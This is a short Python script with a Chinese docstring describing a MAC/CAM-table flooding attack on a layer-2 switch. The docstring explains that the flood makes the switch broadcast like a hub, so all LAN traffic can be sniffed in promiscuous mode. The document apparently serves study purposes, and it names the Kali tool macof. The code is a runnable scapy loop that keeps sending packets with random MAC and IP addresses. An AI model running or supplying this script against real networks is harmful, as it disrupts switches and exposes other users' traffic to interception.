"""
   数据链路层的拒绝服务攻击：
      攻击目标：二层交换机,目的让二层交换机以一种不正常的方式工作。
      交换机比集线器多了记忆和学习的功能。
      如果我们让交换机中的CAM表（动态更新，几分钟刷新一次）一直被填满，使得交换机变得和集线器一样
      不断的往局域网广播。那么此时再将网卡设置成混杂模式，就可以监听整个网络的通行。
      所以代码的作用就是不断的伪造大量的数据包发送到交换机。
      可使用kali工具：macof
      https://www.cnblogs.com/ananing/p/13383541.html
"""
from scapy.all import *
while(1):
   packet=Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()#随机MAC和IP
   time.sleep(0.5)
   sendp(packet)
   print(packet.summary())